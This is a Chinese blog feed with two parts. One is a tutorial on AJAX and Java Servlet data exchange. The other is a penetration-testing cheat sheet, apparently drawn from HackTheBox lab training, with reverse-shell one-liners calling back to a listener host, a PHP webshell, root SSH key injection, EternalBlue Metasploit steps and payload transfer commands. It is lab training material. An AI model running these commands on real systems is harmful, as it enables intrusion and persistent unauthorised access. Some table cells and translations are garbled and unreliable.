javax.servlet.http.HttpServletResponse;import org.json.JSONObject;public class BackendServlet extends HttpServlet &#123;  protected void doGet(HttpServletRequest request, HttpServletResponse response)      throws ServletException, IOException &#123;    // 处理 GET 请求    JSONObject json = new JSONObject();    json.put(&quot;message&quot;, &quot;这是从后端返回的数据&quot;);    response.setContentType(&quot;application/json&quot;);    response.setCharacterEncoding(&quot;UTF-8&quot;);    response.getWriter().write(json.toString());  &#125;&#125;</code></pre><p>在上面的示例中，前端页面使用 AJAX 发送 GET 请求到名为 <code>backendServlet</code> 的后端 Servlet。后端 Servlet 接收到请求后，构造一个包含 JSON 数据的响应，并将其返回给前端。前端页面接收到响应后，通过 AJAX 回调函数处理响应数据，更新页面上的内容。</p><p>请注意，这只是一个简单的示例，实际应用中可能需要更复杂的处理逻辑和错误处理。另外，你需要将后端 Servlet 配置在服务器上，以便能够通过指定的 URL 访问到它。</p><p>这个示例演示了如何使用 AJAX 和 Java Web 技术进行前后端交互，通过 AJAX 发送请求，后端 Servlet 接收请求并返回响应数据。</p><p>JSON（JavaScript Object Notation）是一种用于数据交换的轻量级文本格式。它以易于阅读和编写的方式表示结构化数据，并且易于解析和生成。JSON数据是基于键值对的集合，其中键和值之间使用冒号（:）分隔，键值对之间使用逗号（,）分隔，整个数据使用花括号（{}）括起来。</p><p>以下是一个简单的 JSON 示例：</p><pre><code class="json">&#123;  &quot;name&quot;: &quot;John&quot;,  &quot;age&quot;: 30,  &quot;city&quot;: &quot;New York&quot;&#125;</code></pre><p>在上面的示例中，JSON 表示一个包含三个键值对的对象。键是字符串，用双引号括起来，值可以是字符串、数字、布尔值、数组、嵌套的对象或null。</p><p>JSON 提供了一种通用的数据格式，被广泛用于前后端之间的数据交换。在 Web 开发中，常用于前后端之间的数据传输，尤其是在使用 AJAX 进行异步通信时，常用 JSON 格式来传输数据。</p><p>在前端，可以使用 JavaScript 的内置函数 <code>JSON.parse()</code> 将 JSON 字符串解析为 JavaScript 对象，以便对数据进行处理。反之，可以使用 <code>JSON.stringify()</code> 将 JavaScript 对象转换为 JSON 字符串，以便进行传输或存储。</p><p>总结：JSON 是一种用于数据交换的文本格式，以易读易写的方式表示结构化数据。它广泛用于前后端之间的数据交互，并可以通过 JavaScript 的内置函数进行解析和生成。</p><p>如果前端发送的是 POST 请求，你可以在前端的 AJAX 请求中指定请求方法为 “POST”，并将数据作为请求体发送给后端。在后端的 Servlet 中，你需要相应地处理 POST 请求的数据。</p><p>以下是在前端使用 POST 请求发送数据给后端的示例：</p><p>###前端（使用 AJAX 发送 POST 请求）：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;AJAX POST 请求示例&lt;/title&gt;  &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;button id=&quot;sendDataBtn&quot;&gt;发送数据&lt;/button&gt;  &lt;script&gt;    $(document).ready(function() &#123;      // 当点击按钮时发送 POST 请求      $(&#39;#sendDataBtn&#39;).click(function() &#123;        var data = &#123;          name: &#39;John&#39;,          age: 30        &#125;;        $.ajax(&#123;          url: &#39;backendServlet&#39;, // 后端的 Servlet 地址          type: &#39;POST&#39;,          dataType: &#39;json&#39;,          data: JSON.stringify(data), // 将数据转换为 JSON 字符串发送          contentType: &#39;application/json&#39;,          success: function(response) &#123;            // 请求成功时处理响应            console.log(response.message);          &#125;,          error: function() &#123;            // 请求失败时显示错误信息            console.log(&#39;请求失败&#39;);          &#125;        &#125;);      &#125;);    &#125;);  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>后端（Java Servlet 处理 POST 请求）：</p><pre><code class="java">import java.io.BufferedReader;import java.io.IOException;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.json.JSONObject;public class BackendServlet extends HttpServlet &#123;  protected void doPost(HttpServletRequest request, HttpServletResponse response)      throws ServletException, IOException &#123;    // 从请求体中读取数据    StringBuilder requestBody = new StringBuilder();    BufferedReader reader = request.getReader();    String line;    while ((line = reader.readLine()) != null) &#123;      requestBody.append(line);    &#125;    // 解析请求体中的数据    JSONObject jsonData = new JSONObject(requestBody.toString());    String name = jsonData.getString(&quot;name&quot;);    int age = jsonData.getInt(&quot;age&quot;);    // 处理数据并生成响应    JSONObject jsonResponse = new JSONObject();    jsonResponse.put(&quot;message&quot;, &quot;接收到的数据：&quot; + name + &quot;, &quot; + age);    response.setContentType(&quot;application/json&quot;);    response.setCharacterEncoding(&quot;UTF-8&quot;);    response.getWriter().write(jsonResponse.toString());  &#125;&#125;</code></pre><p>在上面的示例中，前端通过 AJAX 发送 POST 请求到后端的 Servlet。在前端的 AJAX 请求中，我们将请求方法设置为 “POST”，并将数据对象转换为 JSON 字符串后作为请求体发送。在后端的 Servlet 中，我们使用 <code>request.getReader()</code> 方法获取请求体中的数据，并通过 <code>JSONObject</code> 解析和处理数据。然后，我们生成一个包含响应数据的 JSON 对象，并将其作为响应返回给前端。</p><p>需要注意的是，在发送 POST 请求时，要正确设置请求头的 <code>Content-Type</code> 为 <code>&#39;application/json&#39;</code>，以指示请求体的内容类型为 JSON 格式。</p><p>通过以上示例，你可以在前后端之间使用 POST 请求进行数据交互，并在后端的 Servlet 中接收和处理 POST 请求的数据。</p><p>###实时留言板</p><p>要实现一个实时留言板，您可以使用 AJAX 技术与 JavaWeb 后端结合。以下是一个基本的实现示例：</p><ol><li>创建前端页面（例如 <code>index.html</code>）：</li></ol><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;实时留言板&lt;/title&gt;  &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;h1&gt;实时留言板&lt;/h1&gt;  &lt;div id=&quot;messageContainer&quot;&gt;&lt;/div&gt;  &lt;form id=&quot;messageForm&quot;&gt;    &lt;input type=&quot;text&quot; id=&quot;nameInput&quot; placeholder=&quot;姓名&quot;&gt;    &lt;textarea id=&quot;messageInput&quot; placeholder=&quot;留言&quot;&gt;&lt;/textarea&gt;    &lt;button type=&quot;submit&quot;&gt;提交留言&lt;/button&gt;  &lt;/form&gt;  &lt;script&gt;    // 定时更新留言    setInterval(loadMessages, 5000);    // 加载留言    function loadMessages() &#123;      $.ajax(&#123;        url: &#39;GetMessagesServlet&#39;, // 后端的 Servlet 地址        type: &#39;GET&#39;,        dataType: &#39;json&#39;,        success: function(data) &#123;          // 清空留言容器          $(&#39;#messageContainer&#39;).empty();          // 遍历留言列表并添加到容器中          $.each(data, function(index, message) &#123;            var messageHtml = &#39;&lt;div&gt;&lt;strong&gt;&#39; + message.name + &#39;:&lt;/strong&gt; &#39; + message.content + &#39;&lt;/div&gt;&#39;;            $(&#39;#messageContainer&#39;).append(messageHtml);          &#125;);        &#125;,        error: function() &#123;          console.log(&#39;请求失败&#39;);        &#125;      &#125;);    &#125;    // 提交留言    $(&#39;#messageForm&#39;).submit(function(e) &#123;      e.preventDefault();      var name = $(&#39;#nameInput&#39;).val();      var content = $(&#39;#messageInput&#39;).val();      $.ajax(&#123;        url: &#39;AddMessageServlet&#39;, // 后端的 Servlet 地址        type: &#39;POST&#39;,        dataType: &#39;json&#39;,        data: &#123; name: name, content: content &#125;,        success: function() &#123;          // 提交成功后清空输入框并刷新留言          $(&#39;#nameInput&#39;).val(&#39;&#39;);          $(&#39;#messageInput&#39;).val(&#39;&#39;);          loadMessages();        &#125;,        error: function() &#123;          console.log(&#39;提交失败&#39;);        &#125;      &#125;);    &#125;);  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><ol start="2"><li>创建后端 Servlet（例如 <code>GetMessagesServlet</code>）用于获取留言列表：</li></ol><pre><code class="java">@WebServlet(&quot;/GetMessagesServlet&quot;)public class GetMessagesServlet extends HttpServlet &#123;    protected void doGet(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;        // 模拟从数据库或其他存储中获取留言列表        List&lt;Message&gt; messages = new ArrayList&lt;&gt;();        messages.add(new Message(&quot;John&quot;, &quot;Hello&quot;));        messages.add(new Message(&quot;Jane&quot;, &quot;Hi there&quot;));                // 将留言列表转换为 JSON 格式并发送给前端        response.setContentType(&quot;application/json&quot;);        response.setCharacterEncoding(&quot;UTF-8&quot;);        response.getWriter().write(new Gson().toJson(messages));    &#125;&#125;</code></pre><ol start="3"><li>创建后端 Servlet（例如 <code>AddMessageServlet</code>）用于添加留言：</li></ol><pre><code class="java">@WebServlet(&quot;/AddMessageServlet&quot;)public class AddMessageServlet extends HttpServlet &#123;    protected void doPost(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;        // 获取前端提交的留言信息        String name = request.getParameter(&quot;name&quot;);        String content = request.getParameter(&quot;content&quot;);                // TODO: 将留言信息保存到数据库或其他存储中                // 返回成功的状态给前端        response.setContentType(&quot;application/json&quot;);        response.setCharacterEncoding(&quot;UTF-8&quot;);        response.getWriter().write(&quot;&#123;\&quot;status\&quot;:\&quot;success\&quot;&#125;&quot;);    &#125;&#125;</code></pre><p>上述示例中，前端页面使用 AJAX 定时请求 <code>GetMessagesServlet</code> 获取留言列表，并通过 <code>AddMessageServlet</code> 提交留言。后端 Servlet 根据业务逻辑获取或保存留言信息，并将留言列表或成功状态返回给前端。</p><p>请注意，上述示例是一个基本的实现框架，您可以根据自己的需求进行适当修改和扩展。例如，可以在后端使用数据库存储留言信息，可以增加用户认证和权限控制等功能。</p><p>###数组</p><p>要在前端依次展示一个数组内的数据内容，并为每个数据应用特定的样式，您可以使用 JavaScript 和 HTML&#x2F;CSS 来实现。以下是一个简单的示例：</p><p>HTML：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;展示数组数据&lt;/title&gt;  &lt;style&gt;    /* 自定义样式 */    .item &#123;      color: blue;      font-weight: bold;    &#125;  &lt;/style&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;container&quot;&gt;&lt;/div&gt;  &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;  &lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>JavaScript（script.js）：</p><pre><code class="javascript">$(document).ready(function() &#123;  // 定义要展示的数据数组  var data = [&quot;Apple&quot;, &quot;Banana&quot;, &quot;Orange&quot;, &quot;Grapes&quot;];  // 获取容器元素  var container = $(&#39;#container&#39;);  // 遍历数据数组  $.each(data, function(index, item) &#123;    // 创建元素并添加到容器中    var element = $(&#39;&lt;div&gt;&#39;).addClass(&#39;item&#39;).text(item);    container.append(element);  &#125;);&#125;);</code></pre><p>上述示例中，我们定义了一个数组 <code>data</code>，其中包含要展示的数据内容。通过遍历数组，并使用 jQuery 动态创建元素，为每个数据项创建一个 <code>&lt;div&gt;</code> 元素，并为其添加自定义样式。最后，将创建的元素添加到容器 <code>#container</code> 中。</p><p>您可以根据自己的需求修改样式和数组数据，以及对创建的元素进行进一步的自定义和处理。</p><p><code>$(&#39;&lt;div&gt;&#39;)</code> 是使用 jQuery 动态创建一个 <code>&lt;div&gt;</code> 元素的语法。<code>addClass(&#39;item&#39;)</code> 是为该元素添加一个 CSS 类名为 <code>&#39;item&#39;</code>，这样可以应用特定的样式。<code>.text(item)</code> 是设置该元素的文本内容为变量 <code>item</code> 的值。</p><p>这行代码的作用是创建一个 <code>&lt;div&gt;</code> 元素，并添加 <code>&#39;item&#39;</code> 类名和 <code>item</code> 的文本内容。这样可以在 HTML 中展示该元素，并应用特定的样式。</p><p><code>$.each(data, function(index, item) &#123; ... &#125;)</code> 是使用 jQuery 的 <code>$.each()</code> 函数对一个数组或对象进行迭代的语法。在这个语法中，<code>data</code> 是要迭代的数组或对象，<code>index</code> 是当前元素的索引，<code>item</code> 是当前元素的值。</p><p>通过这个语法，你可以遍历数组或对象中的每个元素，并在迭代过程中执行特定的操作。你可以在函数体内部编写代码，对每个元素进行处理。</p><p>例如，如果 <code>data</code> 是一个包含多个数据的数组，你可以在函数体内部使用 <code>item</code> 变量来访问每个数据，并对其进行操作，比如创建元素、设置样式、添加到页面等。这样可以实现按照特定样式展示数组中的数据内容。</p><p>示例代码如下：</p><pre><code class="javascript">$.each(data, function(index, item) &#123;  var element = $(&#39;&lt;div&gt;&#39;).addClass(&#39;item&#39;).text(item);  // 在这里可以对 element 进行进一步的操作，比如设置样式、添加到页面等  // ...&#125;);</code></pre><p>在这个示例中，对于 <code>data</code> 数组中的每个元素，都会创建一个 <code>&lt;div&gt;</code> 元素，并应用 <code>&#39;item&#39;</code> 类名和元素的文本内容为当前元素的值。你可以根据需要在函数体内部对 <code>element</code> 进行进一步的操作。</p>]]></content>
      
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tools</title>
      <link href="/2023/06/11/tools/"/>
      <url>/2023/06/11/tools/</url>
      
        <content type="html"><![CDATA[<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h2><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>常规</strong></td><td></td></tr><tr><td><code>sudo openvpn user.ovpn</code></td><td>连接到虚拟专用网络</td></tr><tr><td><code>ifconfig</code>&#x2F;<code>ip a</code></td><td>显示我们的 IP 地址</td></tr><tr><td><code>netstat -rn</code></td><td>显示可通过 VPN 访问的网络</td></tr><tr><td><code>ssh user@10.10.10.10</code></td><td>通过 SSH 连接到远程服务器</td></tr><tr><td><code>ftp 10.129.42.253</code></td><td>FTP 到远程服务器</td></tr><tr><td><strong>鞘鞘</strong></td><td></td></tr><tr><td><code>tmux</code></td><td>启动 tmux</td></tr><tr><td><code>ctrl+b</code></td><td>TMUX：默认前缀</td></tr><tr><td><code>prefix c</code></td><td>TMUX：新窗口</td></tr><tr><td><code>prefix 1</code></td><td>TMUX：切换到窗口 （<code>1</code>)</td></tr><tr><td><code>prefix shift+%</code></td><td>TMUX：垂直拆分窗格</td></tr><tr><td><code>prefix shift+&quot;</code></td><td>TMUX：水平拆分窗格</td></tr><tr><td><code>prefix -&gt;</code></td><td>TMUX：切换到右窗格</td></tr><tr><td><strong>维姆</strong></td><td></td></tr><tr><td><code>vim file</code></td><td>VIM：使用 VIM 打开<code>file</code></td></tr><tr><td><code>esc+i</code></td><td>VIM：进入模式<code>insert</code></td></tr><tr><td><code>esc</code></td><td>VIM：返回模式<code>normal</code></td></tr><tr><td><code>x</code></td><td>vim：剪切字符</td></tr><tr><td><code>dw</code></td><td>vim：剪切词</td></tr><tr><td><code>dd</code></td><td>vim：切割整条线</td></tr><tr><td><code>yw</code></td><td>vim：复制单词</td></tr><tr><td><code>yy</code></td><td>vim：复制整行</td></tr><tr><td><code>p</code></td><td>vim：粘贴</td></tr><tr><td><code>:1</code></td><td>vim：转到第 1 行。</td></tr><tr><td><code>:w</code></td><td>vim：写入文件“即保存”</td></tr><tr><td><code>:q</code></td><td>vim：退出</td></tr><tr><td><code>:q!</code></td><td>vim：退出而不保存</td></tr><tr><td><code>:wq</code></td><td>vim：写和退出</td></tr></tbody></table><span id="more"></span><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>服务扫描</strong></td><td></td></tr><tr><td><code>nmap 10.129.42.253</code></td><td>在 IP 上运行 nmap</td></tr><tr><td><code>nmap -sV -sC -p- 10.129.42.253</code></td><td>在 IP 上运行 nmap 脚本扫描</td></tr><tr><td><code>locate scripts/citrix</code></td><td>列出各种可用的 nmap 脚本</td></tr><tr><td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td><td>在 IP 上运行 nmap 脚本</td></tr><tr><td><code>netcat 10.10.10.10 22</code></td><td>抓取开放端口的横幅</td></tr><tr><td><code>smbclient -N -L \\\\10.129.42.253</code></td><td>列出中小企业共享</td></tr><tr><td><code>smbclient \\\\10.129.42.253\\users</code></td><td>连接到 SMB 共享</td></tr><tr><td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td><td>扫描 IP 上的 SNMP</td></tr><tr><td><code>onesixtyone -c dict.txt 10.129.42.254</code></td><td>暴力破解 SNMP 机密字符串</td></tr><tr><td><strong>网络枚举</strong></td><td></td></tr><tr><td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td><td>在网站上运行目录扫描</td></tr><tr><td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td><td>在网站上运行子域扫描</td></tr><tr><td><code>curl -IL https://www.inlanefreight.com</code></td><td>抓取网站横幅</td></tr><tr><td><code>whatweb 10.10.10.121</code></td><td>列出有关 Web 服务器&#x2F;证书的详细信息</td></tr><tr><td><code>curl 10.10.10.121/robots.txt</code></td><td>列出潜在目录<code>robots.txt</code></td></tr><tr><td><code>ctrl+U</code></td><td>查看页面源代码（在火狐中）</td></tr><tr><td><strong>公共漏洞利用</strong></td><td></td></tr><tr><td><code>searchsploit openssh 7.2</code></td><td>搜索 Web 应用程序的公共漏洞</td></tr><tr><td><code>msfconsole</code></td><td>MSF：启动 Metasploit 框架</td></tr><tr><td><code>search exploit eternalblue</code></td><td>MSF：在 MSF 中搜索公共漏洞</td></tr><tr><td><code>use exploit/windows/smb/ms17_010_psexec</code></td><td>MSF：开始使用 MSF 模块</td></tr><tr><td><code>show options</code></td><td>MSF：显示 MSF 模块所需的选项</td></tr><tr><td><code>set RHOSTS 10.10.10.40</code></td><td>MSF：设置 MSF 模块选项的值</td></tr><tr><td><code>check</code></td><td>MSF：测试目标服务器是否易受攻击</td></tr><tr><td><code>exploit</code></td><td>MSF：在目标服务器上运行漏洞易受攻击</td></tr><tr><td><strong>使用外壳</strong></td><td></td></tr><tr><td><code>nc -lvnp 1234</code></td><td>在本地端口上启动侦听器<code>nc</code></td></tr><tr><td><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</code></td><td>从远程服务器发送反向外壳</td></tr><tr><td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td><td>&#x2F;bin&#x2F;sh -i 2&gt;&amp;1</td></tr><tr><td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td><td>&#x2F;bin&#x2F;bash -i 2&gt;&amp;1</td></tr><tr><td><code>nc 10.10.10.1 1234</code></td><td>连接到远程服务器上启动的绑定外壳</td></tr><tr><td><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></td><td>升级外壳 TTY （1）</td></tr><tr><td><code>ctrl+z</code>然后然后是两次<code>stty raw -echo``fg``enter</code></td><td>升级外壳 TTY （2）</td></tr><tr><td><code>echo &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]);?&gt;&quot; &gt; /var/www/html/shell.php</code></td><td>创建一个 webshell php 文件</td></tr><tr><td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td><td>在上传的 Web 外壳上执行命令</td></tr><tr><td><strong>权限提升</strong></td><td></td></tr><tr><td><code>./linpeas.sh</code></td><td>运行脚本以枚举远程服务器<code>linpeas</code></td></tr><tr><td><code>sudo -l</code></td><td>列出可用权限<code>sudo</code></td></tr><tr><td><code>sudo -u user /bin/echo Hello World!</code></td><td>运行命令<code>sudo</code></td></tr><tr><td><code>sudo su -</code></td><td>切换到根用户（如果我们有权访问<code>sudo su</code>)</td></tr><tr><td><code>sudo su user -</code></td><td>切换到用户（如果我们有权访问<code>sudo su</code>)</td></tr><tr><td><code>ssh-keygen -f key</code></td><td>创建新的 SSH 密钥</td></tr><tr><td><code>echo &quot;ssh-rsa AAAAB...SNIP...M= user@parrot&quot; &gt;&gt; /root/.ssh/authorized_keys</code></td><td>将生成的公钥添加到用户</td></tr><tr><td><code>ssh root@10.10.10.10 -i key</code></td><td>使用生成的私钥通过 SSH 连接到服务器</td></tr><tr><td><strong>传输文件</strong></td><td></td></tr><tr><td><code>python3 -m http.server 8000</code></td><td>启动本地网络服务器</td></tr><tr><td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td><td>从我们的本地计算机下载远程服务器上的文件</td></tr><tr><td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td><td>从我们的本地计算机下载远程服务器上的文件</td></tr><tr><td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td><td>使用（需要 SSH 访问）将文件传输到远程服务器<code>scp</code></td></tr><tr><td><code>base64 shell -w 0</code></td><td>将文件转换为<code>base64</code></td></tr><tr><td>&#96;echo f0VMR…SNIO…InmDwU</td><td>base64 -d &gt; shell&#96;</td></tr><tr><td><code>md5sum shell</code></td><td>检查文件以确保其转换正确<code>md5sum</code></td></tr></tbody></table><h3 id="网络枚举：gobuster"><a href="#网络枚举：gobuster" class="headerlink" title="网络枚举：gobuster"></a>网络枚举：gobuster</h3><p>发现 Web 应用程序后，始终值得检查一下我们是否可以在 Web 服务器上发现任何不用于公共访问的隐藏文件或目录。我们可以使用<a href="https://github.com/ffuf/ffuf">ffuf</a>或<a href="https://github.com/OJ/gobuster">GoBuster</a>之类的工具来执行此目录枚举。有时我们会发现隐藏的功能或页面&#x2F;目录暴露敏感数据，可以利用这些数据访问 Web 应用程序，甚至在 Web 服务器本身上远程执行代码。</p><p>GoBuster是一个多功能工具，允许执行DNS，vhost和目录暴力强制。该工具具有其他功能，例如枚举公有 AWS S3 存储桶。出于本模块的目的，我们对使用 switch 指定的目录（和文件）暴力破解模式感兴趣。让我们使用单词列表运行一个简单的扫描。<code>dir``dirb``common.txt</code></p><p>  目录&#x2F;文件枚举</p><pre><code>Tanin@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            http://10.10.10.121/[+] Threads:        10[+] Wordlist:       /usr/share/dirb/wordlists/common.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Timeout:        10s===============================================================2020/12/11 21:47:25 Starting gobuster===============================================================/.hta (Status: 403)/.htpasswd (Status: 403)/.htaccess (Status: 403)/index.php (Status: 200)/server-status (Status: 403)/wordpress (Status: 301)===============================================================2020/12/11 21:47:46 Finished===============================================================</code></pre><h4 id="DNS-子域枚举"><a href="#DNS-子域枚举" class="headerlink" title="DNS 子域枚举"></a>DNS 子域枚举</h4><p>子域上还可能托管基本资源，例如管理面板或具有可被利用的附加功能的应用程序。我们可以使用标志来枚举给定域的可用子域来指定 DNS 模式。首先，让我们克隆 SecLists GitHub <a href="https://github.com/danielmiessler/SecLists">存储库</a>，其中包含许多用于模糊测试和利用的有用列表：<code>GoBuster``dns</code></p><h4 id="安装安全列表"><a href="#安装安全列表" class="headerlink" title="安装安全列表"></a>安装安全列表</h4><p>  安装安全列表</p><pre><code>Tanin@htb[/htb]$ git clone https://github.com/danielmiessler/SecLists</code></pre><p>  安装安全列表</p><pre><code>Tanin@htb[/htb]$ sudo apt install seclists -y</code></pre><p>接下来，将 DNS 服务器（如 1.1.1.1）添加到文件中。我们将针对域名，虚构的货运和物流公司的网站。<code>/etc/resolv.conf``inlanefreight.com</code></p><p>  安装安全列表</p><pre><code>Tanin@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Domain:     inlanefreight.com[+] Threads:    10[+] Timeout:    1s[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt===============================================================2020/12/17 23:08:55 Starting gobuster===============================================================Found: blog.inlanefreight.comFound: customer.inlanefreight.comFound: my.inlanefreight.comFound: ns1.inlanefreight.comFound: ns2.inlanefreight.comFound: ns3.inlanefreight.com===============================================================2020/12/17 23:10:34 Finished===============================================================</code></pre><p>这次扫描揭示了几个有趣的子域，我们可以进一步检查。<a href="https://academy.hackthebox.com/module/details/54">使用 Ffuf 攻击 Web 应用程序</a>模块详细介绍了 Web 枚举和模糊测试。</p><h4 id="Whatweb"><a href="#Whatweb" class="headerlink" title="Whatweb"></a>Whatweb</h4><p>我们可以使用 命令行工具 .这些信息可以帮助我们查明正在使用的技术并开始搜索潜在的漏洞。<code>whatweb</code></p><pre><code>Tanin@htb[/htb]$ whatweb 10.10.10.121http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]</code></pre><p><code>Whatweb</code>是一个方便的工具，包含许多功能来自动执行网络上的 Web 应用程序枚举。</p><pre><code>Tanin@htb[/htb]$ whatweb --no-errors 10.10.10.0/24http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]</code></pre><h2 id="查找公共漏洞"><a href="#查找公共漏洞" class="headerlink" title="查找公共漏洞"></a>查找公共漏洞</h2><p>许多工具可以帮助我们搜索在枚举阶段可能遇到的各种应用程序和服务的公共漏洞。一种方法是谷歌应用程序名称，看看我们是否得到任何结果：<code>exploit</code></p><p>为此目的的一个众所周知的工具是 ，我们可以用来搜索任何应用程序的公共漏洞&#x2F;漏洞。我们可以用以下命令安装它：<code>searchsploit</code></p><pre><code>Tanin@htb[/htb]$ sudo apt install exploitdb -y</code></pre><pre><code>Tanin@htb[/htb]$ searchsploit openssh 7.2----------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                               |  Path----------------------------------------------------------------------------------------------------------------------------- ---------------------------------OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                                     | linux/remote/45233.pyOpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.pyOpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.pyOpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.pyOpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.pyOpenSSH &lt; 7.4 - &#39;UsePrivilegeSeparation Disabled&#39; Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txtOpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txtOpenSSH &lt; 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.pyOpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt----------------------------------------------------------------------------------------------------------------------------- ---------------------------------</code></pre><h3 id="权限提升：LinEnum"><a href="#权限提升：LinEnum" class="headerlink" title="权限提升：LinEnum"></a>权限提升：LinEnum</h3><p> <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a></p><h3 id="HASH"><a href="#HASH" class="headerlink" title="HASH:"></a>HASH:</h3><ul><li>hashcat</li><li>CeWL</li></ul><h1 id="amp-amp-amp-；-："><a href="#amp-amp-amp-；-：" class="headerlink" title="&amp;&amp; &amp; ； ："></a><code>&amp;&amp;</code> <code>&amp;</code> <code>；</code> ：</h1><p>这些符号在命令行中具有不同的作用：</p><ol><li><p><code>&amp;&amp;</code>：逻辑与运算符。在命令之间使用 <code>&amp;&amp;</code> 可以实现条件执行，即只有前一个命令成功执行（返回状态码为 0），才会执行后续的命令。例如：</p><pre><code>command1 &amp;&amp; command2</code></pre><p>如果 <code>command1</code> 成功执行，则会执行 <code>command2</code>。如果 <code>command1</code> 执行失败（返回状态码非零），则 <code>command2</code> 将不会执行。</p></li><li><p><code>&amp;</code>：后台运行。在命令的末尾使用 <code>&amp;</code> 可以将命令置于后台运行，即命令在后台继续执行，而不会阻塞终端。例如：</p><pre><code>command &amp;</code></pre><p>使用 <code>&amp;</code> 启动的命令将在后台运行，同时你可以继续在终端中输入其他命令。可以使用 <code>jobs</code> 命令查看后台运行的任务，并使用 <code>fg</code> 或 <code>bg</code> 命令将任务切换到前台或后台。</p></li><li><p><code>；</code>：命令分隔符。在命令之间使用 <code>；</code> 可以将多个命令依次执行，不管前一个命令是否成功执行。例如：</p><pre><code>command1 ; command2 ; 